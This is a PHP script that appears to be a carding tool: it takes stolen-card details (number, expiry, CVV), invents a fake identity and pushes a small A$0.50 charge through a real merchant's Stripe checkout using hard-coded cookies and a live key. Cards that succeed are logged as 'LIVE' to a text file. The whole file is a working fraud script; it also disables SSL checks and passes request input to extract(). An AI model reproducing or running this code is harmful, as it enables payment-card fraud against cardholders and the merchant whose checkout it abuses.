<?php
error_reporting(0); 
 
if($_SERVER['REQUEST_METHOD'] == 'POST'){ 
    extract($_POST); 
} 
else { 
   extract($_GET); 
} 
 
function GetStr($string, $start, $end){ 
    $str = explode($start, $string); 
    $str = explode($end, $str[1]); 
    return $str[0]; 
} 
 
$separator = explode("|", $lista);  
$cc = $separator[0]; 
$mm = $separator[1]; 
$yyyy = $separator[2]; 
$cvv = $separator[3]; 
$yy = substr($yyyy, 2, 4);

function RandomString($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

$shit = mt_rand(1, 99);

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$fname = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$lname = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

//get cs_live
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, 'https://itbasecamp.com.au/enupal/stripe/create-checkout-session'); 
curl_setopt($ch, CURLOPT_HEADER, 0); 
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt'); 
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt'); 
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br'); 
curl_setopt($ch, CURLOPT_HTTPHEADER, array( 
'accept: application/json, text/javascript, */*; q=0.01',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: _ga=GA1.3.123311842.1605967210; __stripe_mid=cf4e2e3f-dbde-46de-ac10-17d1dd2065cfd3c3a7; CraftSessionId=n8r6k306qv5esg23cg1glj657a; CRAFT_CSRF_TOKEN=4c5e0fb167f83d2c5974d06bd26a924a90acc9557d5bb18b370777b241ca8f4ca%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A40%3A%22t6MvAoCtxu-G8YIg6Sy2vPJoaRsobEPwhhsCqbXo%22%3B%7D; _gid=GA1.3.1076607015.1606298826; _gat_UA-53227203-1=1; _gat_UA-53227203-2=1; __stripe_sid=024ac260-cc19-40b1-a162-ac9c764f3991df632b; ccc-counter=6',
'origin: https://itbasecamp.com.au',
'referer: https://itbasecamp.com.au/payments',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
'x-requested-with: XMLHttpRequest'));
curl_setopt($ch, CURLOPT_POSTFIELDS, "CRAFT_CSRF_TOKEN=Ok--o58WlZO-jcd1gG1f1n-1r-n9O3mdY8xIPsPcCfiftpieVnjYsE5589XeedbnxvjqMrg0FrFJ5tbbi2sz8gKeO1GhmVmP997r3ScagN8%3D&action=enupal-stripe%2Fstripe%2Fsave-order&redirect=00996f820c9fba15ae8b58d10022acddf6b53418e71d54d707e081da76c673ca%2Fpage%2Fpayment-thanks&enableCheckout=1&enupalStripe%5Btoken%5D=&enupalStripe%5Bemail%5D=&enupalStripe%5BformId%5D=564&enupalStripe%5Bamount%5D=50&enupalStripe%5Bquantity%5D=1&enupalStripe%5BtaxAmount%5D=&enupalStripe%5BamountBeforeTax%5D=&enupalStripe%5BstripeData%5D=&enupalStripe%5BtestMode%5D=0&enupalStripe%5Bmetadata%5D%5BInvoiceNo%5D=AT12345&enupalStripe%5Bmetadata%5D%5BDescription%5D=AT12345&enupalStripe%5Bmetadata%5D%5BName%5D=AT12345&enupalStripe%5BcustomAmount%5D=0.5&couponCode=&enupalCouponCode=&enupalStripe%5BenupalLineItems%5D=&enupalStripe%5BenupalAllowPromotionCodes%5D=&enupalStripe%5BenupalRemoveDefaultItem%5D=&action=enupal-stripe%2Fcheckout%2Fcreate-session&enupalStripeData=%7B%22useSca%22%3A%221%22%2C%22checkoutSuccessUrl%22%3A%22%22%2C%22checkoutCancelUrl%22%3A%22%22%2C%22paymentFormId%22%3A564%2C%22handle%22%3A%22paymentForm2%22%2C%22amountType%22%3A%221%22%2C%22customerQuantity%22%3Afalse%2C%22buttonText%22%3A%22%22%2C%22paymentButtonProcessingText%22%3A%22Pay+with+card%22%2C%22pbk%22%3A%22pk_live_GXdE1zUnlOKHhzg8bBzgOxC1%22%2C%22testMode%22%3A0%2C%22enableRecurringPayment%22%3Afalse%2C%22recurringPaymentType%22%3A%22year%22%2C%22customAmountLabel%22%3A%22Invoice+Total%22%2C%22enableSubscriptions%22%3Anull%2C%22subscriptionType%22%3A%220%22%2C%22subscriptionStyle%22%3A%22radio%22%2C%22singleSetupFee%22%3Anull%2C%22enableCustomPlanAmount%22%3Anull%2C%22multiplePlansAmounts%22%3A%5B%5D%2C%22setupFees%22%3A%5B%5D%2C%22applyTax%22%3Afalse%2C%22enableTaxes%22%3A0%2C%22tax%22%3Anull%2C%22currencySymbol%22%3A%22A%24%22%2C%22taxLabel%22%3A%22Tax+Amount%22%2C%22paymentTypeIds%22%3Anull%2C%22enableShippingAddress%22%3Anull%2C%22enableBillingAddress%22%3Anull%2C%22coupon%22%3A%7B%22enabled%22%3Afalse%2C%22displayTotal%22%3Afalse%2C%22totalAmountLabel%22%3Afalse%2C%22label%22%3A%22Coupon+Code%22%2C%22successMessage%22%3A%22%7Bname%7D+-+%7Bid%7D%22%2C%22errorMessage%22%3A%22This+coupon+is+not+valid%22%7D%2C%22quantity%22%3A1%2C%22stripe%22%3A%7B%22description%22%3A%22Invoice+Payment+Form%22%2C%22panelLabel%22%3A%22%22%2C%22name%22%3A%22IT+Basecamp+%22%2C%22currency%22%3A%22AUD%22%2C%22locale%22%3A%22en%22%2C%22amount%22%3A%2250%22%2C%22image%22%3A%22https%3A%2F%2Fitbasecamp.com.au%2Fimages%2Fstripe-logo.png%22%2C%22email%22%3A%22%22%2C%22allowRememberMe%22%3Afalse%2C%22zipCode%22%3Afalse%7D%7D"); 
$f0 = curl_exec($ch); 
curl_close($ch); 
$cs_live = GetStr($f0, '"sessionId":"','"');

//get ppage
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/payment_pages/$cs_live?key=pk_live_GXdE1zUnlOKHhzg8bBzgOxC1"); 
curl_setopt($ch, CURLOPT_HEADER, 0); 
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt'); 
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt'); 
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br'); 
curl_setopt($ch, CURLOPT_HTTPHEADER, array( 
'accept: application/json',
'origin: https://checkout.stripe.com',
'referer: https://checkout.stripe.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'));
$f1 = curl_exec($ch); 
curl_close($ch); 
$ppage = GetStr($f1, '"id": "','"');

//get payment_method id
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/payment_methods"); 
curl_setopt($ch, CURLOPT_HEADER, 0); 
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt'); 
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt'); 
curl_setopt($ch, CURLOPT_HTTPHEADER, array( 
'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'origin: https://checkout.stripe.com',
'referer: https://checkout.stripe.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36')); 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&billing_details[name]='.$fname.'+'.$lname.'&billing_details[email]='.$fname.''.$lname.'%40gmail.com&billing_details[address][country]=CL&guid=766309e5-164d-42c4-bbee-35b9467c69b4751a57&muid=cf4e2e3f-dbde-46de-ac10-17d1dd2065cfd3c3a7&sid=024ac260-cc19-40b1-a162-ac9c764f3991df632b&key=pk_live_GXdE1zUnlOKHhzg8bBzgOxC1&payment_user_agent=stripe.js%2Faef56bce%3B+stripe-js-v3%2Faef56bce%3B+checkout'); 
$f2 = curl_exec($ch);
curl_close($ch); 
$pm = GetStr($f2, '"id": "', '"');

//confirm
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/payment_pages/$ppage/confirm"); 
curl_setopt($ch, CURLOPT_HEADER, 0); 
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt'); 
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt'); 
curl_setopt($ch, CURLOPT_HTTPHEADER, array( 
'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'origin: https://checkout.stripe.com',
'referer: https://checkout.stripe.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36')); 
curl_setopt($ch, CURLOPT_POSTFIELDS, "eid=NA&payment_method=$pm&expected_amount=50&key=pk_live_GXdE1zUnlOKHhzg8bBzgOxC1"); 
$f3 = curl_exec($ch);
curl_close($ch); 

$dcode = GetStr($f3, '"decline_code": "', '"');
$message = GetStr($f3, '"message": "', '"');
$confirmation = GetStr($f3, '"state": "', '"');

if(strpos($f3, 'succeeded')){ 
    
    echo '<tr><td><span class="badge badge-outline-success badge-pill">LIVE</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-success badge-pill">Response: '.$confirmation.'</span></td></tr><br>'; 
    fwrite(fopen("jordan.txt", "a"), $lista."\r\n");
}
else { 
	echo '<tr><td><span class="badge badge-outline-danger badge-pill">DEAD</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-danger badge-pill">'.$dcode.' '.$message.'</span></td></tr><br>'; 
}
?>
